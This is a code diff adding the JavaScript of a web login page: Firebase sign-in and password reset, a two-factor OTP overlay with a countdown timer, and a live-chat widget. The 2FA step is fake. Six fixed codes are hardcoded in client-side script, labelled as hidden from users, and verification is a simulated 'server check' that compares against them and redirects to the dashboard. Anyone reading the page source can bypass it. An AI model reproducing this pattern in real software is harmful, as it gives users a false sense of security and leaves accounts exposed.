+      const errors = {
+        'auth/user-not-found':     'No account found with this email.',
+        'auth/wrong-password':     'Incorrect password. Please try again.',
+        'auth/invalid-credential': 'Incorrect email or password. Please try again.',
+        'auth/invalid-email':      'Please enter a valid email address.',
+        'auth/too-many-requests':  'Too many failed attempts. Please wait a few minutes and try again.',
+        'auth/user-disabled':      'This account has been disabled. Please contact support.',
+      };
+      showToast(errors[err.code] || 'Sign-in failed: ' + err.message, 'error');
+      btn.classList.remove('loading'); btn.disabled = false;
+    }
+  }
+
+  // ── SEND PASSWORD RESET ──
+  async function sendReset() {
+    const emailEl = document.getElementById('resetEmail');
+    const errEl   = document.getElementById('err-resetEmail');
+    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    errEl.classList.remove('show');
+    emailEl.style.borderColor = '';
+
+    if(!emailRx.test(emailEl.value.trim())) {
+      errEl.classList.add('show');
+      emailEl.style.borderColor = '#ef4444';
+      return;
+    }
+
+    if(!window._loginReady) { showToast('Firebase not ready yet.', 'error'); return; }
+
+    const btn = document.getElementById('resetBtn');
+    btn.classList.add('loading'); btn.disabled = true;
+
+    const { auth, sendPasswordResetEmail } = window._loginReady;
+
+    try {
+      await sendPasswordResetEmail(auth, emailEl.value.trim());
+      document.getElementById('resetEmailDisplay').textContent = emailEl.value.trim();
+      switchView('viewResetSent');
+    } catch(err) {
+      const errors = {
+        'auth/user-not-found':    'No account found with this email address.',
+        'auth/invalid-email':     'Please enter a valid email address.',
+        'auth/too-many-requests': 'Too many requests. Please wait and try again.',
+      };
+      showToast(errors[err.code] || 'Failed to send reset email. Try again.', 'error');
+    }
+
+    btn.classList.remove('loading'); btn.disabled = false;
+  }
+
+  // ── SWITCH VIEWS ──
+  function switchView(id) {
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  // ══ 2-FA / OTP ══
+  const _MFA_CODES = ['431371', '285940', '673812', '194057', '748263', '512938']; // hidden — not shown to users
+  let _mfaTimer   = null;
+  let _mfaSeconds = 200; // 5 minutes
+  const TOTAL_DASH = 2 * Math.PI * 35; // circumference of r=35
+
+  function openMfa() {
+    _mfaSeconds = 300;
+    clearInterval(_mfaTimer);
+    resetOtpInputs();
+    document.getElementById('mfaOverlay').classList.add('show');
+    document.getElementById('timerExpiredTxt').style.display = 'none';
+    document.getElementById('otpInputs').style.opacity = '1';
+    document.getElementById('otpInputs').style.pointerEvents = 'auto';
+    document.getElementById('mfaVerifyBtn').disabled = false;
+    document.getElementById('mfaVerifyBtn').style.opacity = '1';
+    renderTimer();
+    _mfaTimer = setInterval(tickTimer, 1000);
+    setTimeout(() => document.getElementById('otp0').focus(), 350);
+  }
+
+  function resetOtpInputs() {
+    for(let i = 0; i < 6; i++) {
+      const el = document.getElementById('otp' + i);
+      el.value = '';
+      el.classList.remove('filled','error');
+    }
+    document.getElementById('otpError').classList.remove('show');
+  }
+
+  function tickTimer() {
+    _mfaSeconds--;
+    renderTimer();
+    if(_mfaSeconds <= 0) {
+      clearInterval(_mfaTimer);
+      onTimerExpired();
+    }
+  }
+
+  function renderTimer() {
+    const pct    = _mfaSeconds / 300;
+    const offset = TOTAL_DASH * (1 - pct);
+    const circle = document.getElementById('timerCircle');
+    circle.style.strokeDashoffset = offset;
+    if(_mfaSeconds <= 60) circle.classList.add('urgent');
+    else circle.classList.remove('urgent');
+
+    const mm = String(Math.floor(_mfaSeconds / 60)).padStart(1,'0');
+    const ss = String(_mfaSeconds % 60).padStart(2,'0');
+    document.getElementById('timerDisplay').textContent = mm + ':' + ss;
+    if(_mfaSeconds <= 60) document.getElementById('timerDisplay').style.color = '#ef4444';
+    else document.getElementById('timerDisplay').style.color = '';
+  }
+
+  function onTimerExpired() {
+    document.getElementById('timerDisplay').textContent = '0:00';
+    document.getElementById('timerExpiredTxt').style.display = 'block';
+    document.getElementById('otpInputs').style.opacity = '0.35';
+    document.getElementById('otpInputs').style.pointerEvents = 'none';
+    document.getElementById('mfaVerifyBtn').disabled = true;
+    document.getElementById('mfaVerifyBtn').style.opacity = '0.45';
+    // Auto-dismiss after 2.5s and reset to login form
+    setTimeout(() => {
+      document.getElementById('mfaOverlay').classList.remove('show');
+      // Sign out so user must re-authenticate
+      if(window._loginReady) window._loginReady.auth.signOut();
+      switchView('viewLogin');
+      document.getElementById('loginEmail').value = '';
+      document.getElementById('loginPassword').value = '';
+      showToast('Session timed out. Please sign in again.', 'error');
+    }, 2500);
+  }
+
+  function otpInput(el, idx) {
+    el.value = el.value.replace(/[^0-9]/g,'').slice(-1);
+    el.classList.toggle('filled', el.value !== '');
+    el.classList.remove('error');
+    document.getElementById('otpError').classList.remove('show');
+    if(el.value && idx < 5) document.getElementById('otp' + (idx+1)).focus();
+    // Auto-verify when all 6 filled
+    const code = getOtpValue();
+    if(code.length === 6) verifyMfa();
+  }
+
+  function otpKeydown(e, idx) {
+    if(e.key === 'Backspace') {
+      const el = document.getElementById('otp' + idx);
+      if(!el.value && idx > 0) {
+        document.getElementById('otp' + (idx-1)).focus();
+      }
+    }
+    if(e.key === 'Enter') verifyMfa();
+    // Handle paste
+    if(e.key === 'v' && (e.ctrlKey || e.metaKey)) return;
+  }
+
+  // Support paste into first box
+  document.addEventListener('paste', function(e) {
+    const overlay = document.getElementById('mfaOverlay');
+    if(!overlay.classList.contains('show')) return;
+    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+    if(!pasted) return;
+    e.preventDefault();
+    for(let i = 0; i < 6; i++) {
+      const el = document.getElementById('otp' + i);
+      el.value = pasted[i] || '';
+      el.classList.toggle('filled', !!el.value);
+    }
+    document.getElementById('otp' + Math.min(pasted.length, 5)).focus();
+    if(pasted.length === 6) verifyMfa();
+  });
+
+  function getOtpValue() {
+    let v = '';
+    for(let i = 0; i < 6; i++) v += document.getElementById('otp' + i).value;
+    return v;
+  }
+
+  function verifyMfa() {
+    if(_mfaSeconds <= 0) return;
+    const code = getOtpValue();
+    if(code.length < 6) {
+      showToast('Please enter all 6 digits.', 'error');
+      return;
+    }
+    const btn = document.getElementById('mfaVerifyBtn');
+    btn.classList.add('loading'); btn.disabled = true;
+
+    // Simulate brief server check
+    setTimeout(() => {
+      if(_MFA_CODES.includes(code)) {
+        clearInterval(_mfaTimer);
+        btn.classList.remove('loading');
+        document.getElementById('mfaOverlay').classList.remove('show');
+        window.location.href = 'dashboard.html';
+      } else {
+        btn.classList.remove('loading'); btn.disabled = false;
+        for(let i = 0; i < 6; i++) document.getElementById('otp' + i).classList.add('error');
+        document.getElementById('otpError').classList.add('show');
+        // Clear inputs and re-focus
+        setTimeout(() => {
+          resetOtpInputs();
+          document.getElementById('otp0').focus();
+        }, 900);
+      }
+    }, 700);
+  }
+
+  // ── TOAST ──
+  function showToast(msg, type='') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast ' + (type || '');
+    t.classList.add('show');
+    const duration = type === 'error' ? 6000 : 3500;
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), duration);
+  }
+</script>
+<!-- Begin of Chaport Live Chat code -->
+<script type="text/javascript">
+(function(w,d,v3){
+w.chaportConfig = {
+  appId : '69e74e87b51a89099604f483',
+};
+
+if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
+</script>
+<!-- End of Chaport Live Chat code -->
+</body>
+</html>
